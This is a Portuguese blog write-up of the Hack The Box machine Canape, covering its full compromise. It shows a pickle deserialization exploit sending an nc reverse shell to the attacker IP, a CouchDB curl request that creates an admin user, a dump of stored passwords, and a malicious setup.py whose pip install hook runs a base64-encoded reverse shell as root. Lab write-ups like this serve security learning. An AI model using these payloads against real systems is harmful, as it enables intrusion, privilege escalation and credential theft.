---
layout: post
title: Canape [Hack The Box] - Modificando exploits e explorando o Pip
author: obrerodrigues
categories: [CTFs, Favorites]
tags: [Hack The Box]
---

![](https://raw.githubusercontent.com/brerodrigues/brerodrigues.github.io/master/assets/img/canape.png)

Essa máquina foi uma das menos fáceis e mais interesantes que encarei e consegui pegar root no htb. Foi necessário até modificar um exploit que achei jogado nas webs.

Começando com um **nmap -v -A** obtive o seguinte:

```
# Nmap 7.70 scan initiated Sat Sep 15 01:39:35 2018 as: nmap -v -A -oN /home/user/Desktop/nmap.txt 10.10.10.70
Nmap scan report for git.canape.htb (10.10.10.70)
Host is up (0.25s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title.
```

Há um apache rodando um site de citações dos simpsons. Há uma área onde pode-se submeter citações, que pelo que vi, valida se o nome do personagem é um nome válido e pá. Até aí não encontrei nada explorável de forma evidente. Dando uma sacada no código fonte da página encontrei no header, naquele menu onde ficam as opções do site, o seguinte html comentado:

```
<!--
c8a74a098a60aaea1af98945bd707a7eab0ff4b0 - temporarily hide check
<li class="nav-item">
  <a class="nav-link" href="/check">Check Submission</a>
</li>
-->
```

Aparenta ser um link para checar as submissões. Ao tentar acessar o link direto no firefox, recebo um 405 me dizendo **Method Not Allowed**, ou seja, o GET que o firefox mandou não é a forma de se comunicar com o /check. Usei o **Burp** porque era mais fácil do que pesquisar como mandar um OPTIONS via Curl, e, ao requisitar http://10.10.10.70/check usando OPTIONS ao invés do GET, recebo os métodos, no caso o único método, o POST, que é permitido para conversar com /check. Ao mandar o POST, recebo como resposta um **400 Bad Request** que ainda informava que **The browser (or proxy) sent a request that this server could not understand.**. Isso acontecia porque eu estava mandando a requisição POST sem os paramêtros necessários para o servidor trabalhar. Pensei em usar o wfuzz para fazer um brute-force e descobrir que parâmetro poderia usar, mas desisti da ideia. Talvez houvesse um caminho mais fácil.

Tentei usar o dirbuster para descobrir algum diretório mas o site retornava um 200 e uma string aparentemente aleatória, ou a própria página inicial do site, sempre que era feita uma requisição para um diretório ou arquivo que não existia. Aí tava meio foda para poder filtrar o que era e o que não era. Poderia filtrar? Poderia. Mas não quis.

Desisti dessa máquina por um tempo por ter ficado sem ideiais. Então, em outro dia aleatório voltei a mesma e, foda-se por qual razão, rodei um novo scanner com o nmap e obtive esse resultado:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: CCD1870C3EB5C66B66D9E5A31B7A7DF6
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
```

Olha só, um repositório git foi encontrado! Não sei bem porque cargas d'água não consegui isso no primeiro scan, mas me animei porque agora outras portas foram abertas. Se fosse possível pegar o código fonte do site, seria possível ver o parêmtro para /check ou quem sabe algo melhor.

Para clonar o git, inseri git.canape.htb no meu arquivo HOSTS e apontei para o endereço ip 10.10.10.70:80 por motivos óbvios.

```
$git clone http://git.canape.htb/simpsons.git
Cloning into 'simpsons'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 49 (delta 18), reused 0 (delta 0)
Unpacking objects: 100% (49/49), done.
```

Como era de se esperar, temos o código para o site:

```
┌─[user@parrot]─[/tmp]
└──╼ $cd simpsons/
┌─[user@parrot]─[/tmp/simpsons]
└──╼ $ls
__init__.py  static  templates
```

O diretório static contém os arquivos css e js e o templates os arquivos html. O que interessa está em __init__.py.

<script src="https://gist.github.com/brerodrigues/257d98376eb085e46c49d0de5625b05f.js"></script>

Podemos ver que na parte do "submit quotes", é feita uma verificação do nome do personagem de acordo com uma lista e, se ele estiver na lista, é criado um arquivo em /tmp com o nome formado por um hash md5 do nome do personagem e a citação, e a extensão .p.

É possível também analisar o que /check faz, que é bem simples: recebe via paramêtro 'id' o md5, lê o arquivo, se "p1" estiver no arquivo, carrega o conteúdo do mesmo usando um tal de cPickle que eu ainda não fazia ideia o que era, e se não encontrar "p1", não usa o cPickle e no fim retorna um "Still reviewing " + a citação que enviamos.

Outras informações úteis foi descobrir que o site usa um servidor couchdb, o nome do banco e tal. Coisas que podiam ser úteis num futuro.

Fui pesquisar sobre o tal cPickle e descobri que o mesmo é usado para serializar and de-serializar objetos em python. Isso costuma ser perigoso quando é feito com objetos que o usuário controla. [A própria página](https://docs.python.org/2/library/pickle.html) alerta:

```
Warning

The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
```

Não vou dar uma aula sobre de-serialização e essas porra porque não sou capaz, vale uma pesquisa sua no google para entender melhor.

Então, pesquisando "cPickle exploit" no google encontramos formas de explorar o mal uso desse módulo e um [esqueleto de exploit] (https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14).

Desse esqueleto criei o exploit para o site. É um script bem mal feito mas que dá conta do recado.

<script src="https://gist.github.com/brerodrigues/7e195b28078a80d6db98fe130686210f.js"></script>

É alto explicativo, mas para os senhores que não se alto explicaram, aqui vai um resumo breve: crio um pickle venenoso contendo o comando para jogar uma shell reversa para meu ip, desse pickle venenoso monto a requisição para o /submit do site, que vai receber de boas e criar o arquivo. Como sabemos que é criado um md5 do nome do personagem + citação para ser usado como identificador, se cria uma string md5 com com os mesmos valores e se usa essa string para fazer a requisição para /check e ler nosso pickle venenoso e executar o comando.

Isso foi bem menos resumido do que imaginei, mas é isso aí.

Foi só deixar o netcat ouvindo e rodar o exploit para obter uma shell reversa.

```
└──╼ $nc -l -vv -p 1337
listening on [any] 1337 ...
```

E em outro terminal:

```
└──╼ $python expl.py
To run rm /tmp/not_malicious;mkfifo /tmp/not_malicious;cat /tmp/not_malicious|/bin/sh -i 2>&1|nc 10.10.14.120 1337 >/tmp/not_malicious && bart
Exploit (probably) crafted in /tmp/8c1649e6060aa1d0e9a3b08c799d0dda.p
And if nothing is wrong, you have a reverse shell!
```

Dito e feito:

```
└──╼ $nc -l -vv -p 1337
listening on [any] 1337 ...
10.10.10.70: inverse host lookup failed: Unknown host
connect to [10.10.14.120] from (UNKNOWN) [10.10.10.70] 47318
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

O usuário www-data não dá nem a flag do user. E, dando uma olhada no diretório /home pode-se ver que nosso alvo é o usuário homer.
Depois de dar uma fuçada aqui ali, lembrar, após rodar um **netstat -l**, que havia um servidor de banco de dados rodando, pensei em ir nas configurações do servidor web e puxar as credenciais do banco. Poderia ter algo útil. Para minha surpresa, graças ao netstat, também observei um servidor SSH que o nmap não encontrou porque está rodando na porta 65535. Um script kiddie, como eu, rodando o nmap com as flags padrão também deixaria passar essa porta de entrada. Da próxima vez não custa nada deixar um nmap -p- rodando em background enquanto estou tentando outras coisas. Nunca se sabe.

Voltando ao banco de dados: encontrei um rce para o mesmo que permite a criação de um usuário admin [https://justi.cz/security/2017/11/14/couchdb-rce-npm.html](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html)


```
$ curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:ratf' --data-binary '{"type": "user", "name": "ratf", "roles":["_admin"], "roles": [], "password": "password" }'
<", "roles":["_admin"], "roles": [], "password": "password" }'
{"ok":true,"id":"org.couchdb.user:oops2","rev":"1-f464111abaed3e1de36f3066c0011c71"}
www-data@canape:/$
```

Bom, agora com acesso adm ao banco, hora de ver o que havia guardado. Acessar os recursos do couchdb via curl foi trabalhoso porque no começo eu não fazia ideia do que realmente estava fazendo. Foi após ler [documentação](http://docs.couchdb.org/en/stable/intro/curl.html) atrás de [documentação](http://guide.couchdb.org/draft/tour.html) que comecei a compreender como mandar umas querys. Logo mandei uma que me retornasse credenciais.

```
$ curl -X GET curl -X GET ‘http://ratf:password@localhost:5984/passwords/_all_docs?include_docs=true'
```

Recebi como resposta um json nojento e não formatado na tela. Após formata-lo, vi isso:


```
{
  "_id": "739c5ebdf3f7a001bebb8fc4380019e4",
  "_rev": "2-81cf17b971d9229c54be92eeee723296",
  "item": "ssh",
  "password": "0B4jyA0xtytZi7esBNGp",
  "user": ""
}

{
  "_id": "739c5ebdf3f7a001bebb8fc43800368d",
  "_rev": "2-43f8db6aa3b51643c9a0e21cacd92c6e",
  "item": "couchdb",
  "password": "r3lax0Nth3C0UCH",
  "user": "couchy"{
  "_id": "739c5ebdf3f7a001bebb8fc438004738",
  "_rev": "1-49a20010e64044ee7571b8c1b902cf8c",
  "user": "homerj0121",
  "item": "github",
  "password": "STOP STORING YOUR PASSWORDS HERE -Admin"
}
}

{
  "_id": "739c5ebdf3f7a001bebb8fc438003e5f",
  "_rev": "1-77cd0af093b96943ecb42c2e5358fe61",
  "item": "simpsonsfanclub.com",
  "password": "h02ddjdj2k2k2",
  "user": "homer"
}
```

O primeiro, 'ssh', com seu password pareceu sedutor. Então tentei logar com o usuário homer e esse password.

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@canape:/$ ssh homer@localhost -p 65535
ssh homer@localhost -p 65535
Could not create directory '/var/www/.ssh'.
The authenticity of host '[localhost]:65535 ([127.0.0.1]:65535)' can't be established.
ECDSA key fingerprint is SHA256:ojMYU5Q6ljmXdvYjbNF4D1mA5ndrq8D8dkMLx4Bs1cs.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
homer@localhost's password: 0B4jyA0xtytZi7esBNGp

Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Sep 14 19:45:48 2018 from 10.10.16.244
homer@canape:~$
```

Virei homer! Hora de pegar essa flag suada.

```
homer@canape:~$ pwd
pwd
/home/homer
homer@canape:~$ ls
ls
bin  data  erts-7.3  etc  lib  LICENSE  releases  share  user.txt  var
homer@canape:~$ cat user.txt
cat user.txt
bce918696f293e62b2321703bb27288d
```

Obter root não foi tão demorado quanto foi para conseguir a primeira flag, o primeiro passo foi pegar os privilégios sudo do homer.

```
homer@canape:~$ sudo -l
sudo -l
[sudo] password for homer: 0B4jyA0xtytZi7esBNGp

Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

Uma pesquisa rápida por "pip privelege escalation" me trouxe isso: [https://github.com/0x00-0x00/FakePip](https://github.com/0x00-0x00/FakePip). É óbvio que rodar algo que execute comandos não deve ser rodado como root. A não ser que você deseje isso.
Logo baixei o setup.py para meu computador, modifiquei para inserir o meu ip e porta para a shell reversa, subi o SimpleHttpServer para hospedar o setup.py e, da máquina invadida, mandei um wget:

```
homer@canape:~$ wget http://10.10.14.120:8000/setup.py
wget http://10.10.14.120:8000/setup.py
--2018-09-14 19:59:50--  http://10.10.14.120:8000/setup.py
Connecting to 10.10.14.120:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 982 [text/plain]
Saving to: ‘setup.py’

setup.py            100%[===================>]     982  --.-KB/s    in 0s

2018-09-14 19:59:50 (95.3 MB/s) - ‘setup.py’ saved [982/982]

homer@canape:~$ cat setup.py
cat setup.py
from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    RHOST = '10.10.14.120'  # change this

    reverse_shell = 'python -c "import os; import pty; import socket; lhost = \'%s\'; lport = 1338; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"' % RHOST
    encoded = base64.b64encode(reverse_shell)
    os.system('echo %s|base64 -d|bash' % encoded)


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
cmdclass={'install': CustomInstall})
```

De boa na lagoa. Foi só rodar o pip install:

```
homer@canape:~$ sudo pip install . --upgrade --force-reinstall
sudo pip install . --upgrade --force-reinstall
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing /home/homer
Installing collected packages: FakePip
  Found existing installation: FakePip 0.0.1
    Uninstalling FakePip-0.0.1:
      Successfully uninstalled FakePip-0.0.1
  Running setup.py install for FakePip ... -
```

E no meu pc receber a shell. Observe o que é alguém com sono tentando ler um arquivo no terminal:

```
└──╼ $nc -l -v -p 1338
listening on [any] 1338 ...
connect to [10.10.14.120] from git.canape.htb [10.10.10.70] 47554
root@canape:/tmp/pip-7IjjG6-build# ls
ls
bin             etc               pip-delete-this-directory.txt  share
data            FakePip.egg-info  pip-egg-info                   user.txt
erl_crash.dump  lib               releases                       var
erts-7.3        LICENSE           setup.py
root@canape:/tmp/pip-7IjjG6-build# cat /root
cat /root
cat: /root: Is a directory
root@canape:/tmp/pip-7IjjG6-build# ls
ls
bin             etc               pip-delete-this-directory.txt  share
data            FakePip.egg-info  pip-egg-info                   user.txt
erl_crash.dump  lib               releases                       var
erts-7.3        LICENSE           setup.py
root@canape:/tmp/pip-7IjjG6-build# cd /
cd /
root@canape:/# ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
root@canape:/# cd /root
cd /root
root@canape:/root# ls
ls
root.txt
root@canape:/root# cat root.txt
cat root.txt
928c3df1a12d7f67d2e8c2937120976d
```
